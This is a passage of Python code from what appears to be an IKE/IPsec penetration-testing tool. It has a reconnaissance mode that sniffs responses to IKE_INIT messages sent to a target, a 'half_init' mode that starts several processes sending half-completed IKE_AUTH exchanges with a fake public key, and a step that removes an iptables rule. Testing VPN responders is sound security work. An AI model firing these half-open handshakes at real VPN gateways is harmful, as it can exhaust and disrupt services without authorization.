    proposals = create_list_of_proposals(values.proposals) #To be used for the IKE_INIT messages outside Sniffer

    if values.recon:
        pr = multiprocessing.Process(target=mySniffer, args=(values.interface,target_IP,values.recon,values.listen,key_length,IKE_payloads,IKE_payloads2,values.proposals,values.proposals2,values.subnet,values.stimeout,ike_destination_port,ike_source_port,int(values.length_proposal),int(values.length_transform),int(values.nu_of_tr),int(values.size_Notify_data),int(values.type_cert_request),int(values.fragments),values.incomplete_fragment,fi,fw,values.no_of_ca,values.spi,values.spi_number,values.spi_other))
        pr.daemon = True
        pr.start()
        time.sleep(1)
        ike_init(target_IP,key_length,IKE_payloads,proposals,int(values.length_ike),int(values.length_proposal),int(values.length_transform),int(values.nu_of_tr),int(values.size_Notify_data),int(values.type_cert_request),None,None,False,0,False,values.subnet,values.throttle,my_public_key,None,False,values.no_of_ca,target_IP,values.spi,values.spi_number,values.spi_other)
        if (values.listen):
            time.sleep(float(values.stimeout))
        else:
            time.sleep(1) #Wait for the return if only recon
    elif values.half_init:
        #print(values.random)
        my_fake_public_key=os.urandom(128)
        copy_proposals = create_list_of_proposals(values.proposals) 
        the_proposals,nu_of_tr_initial = create_proposals(copy_proposals,values.length_proposal,values.length_transform,values.nu_of_tr)
        first_payload,ike_payload_chain = create_chain_payloads(IKE_payloads,the_proposals,my_fake_public_key,my_nonce,values.type_cert_request,values.size_Notify_data,None,values.no_of_ca,target_IP,values.spi,values.spi_number)
        for i in range(0,int(values.threads)):
            auth_pr = multiprocessing.Process(target = half_ike_auth,args=(values.interface,float(values.stimeout),int(values.port),int(values.sport),first_payload,ike_payload_chain))
            auth_pr.daemon = True
            auth_pr.start()
        ike_init(target_IP,key_length,IKE_payloads,proposals,int(values.length_ike),int(values.length_proposal),int(values.length_transform),int(values.nu_of_tr),int(values.size_Notify_data),int(values.type_cert_request),fw,fi,False,0,True,values.subnet, values.throttle,my_fake_public_key,None,values.random,values.no_of_ca,target_IP,values.spi,values.spi_number,values.spi_other)
    elif values.listen:
        print("listening")
        mySniffer(values.interface,target_IP,values.recon,values.listen,key_length,IKE_payloads,IKE_payloads2,values.proposals,values.proposals2,values.subnet,values.stimeout,ike_destination_port,ike_source_port,int(values.length_proposal),int(values.length_transform),int(values.nu_of_tr),int(values.size_Notify_data),int(values.type_cert_request),int(values.fragments),values.incomplete_fragment,fi,fw,values.no_of_ca,values.spi,values.spi_number,values.spi_other)
        time.sleep(float(values.stimeout))

    #RECONFIGURE IPTABLES
    if(sys.platform.startswith('linux')):
        print("Reconfigure iptables to the old state")
        subprocess.call(['iptables', '-D', 'OUTPUT', '1'])
        print("DONE")

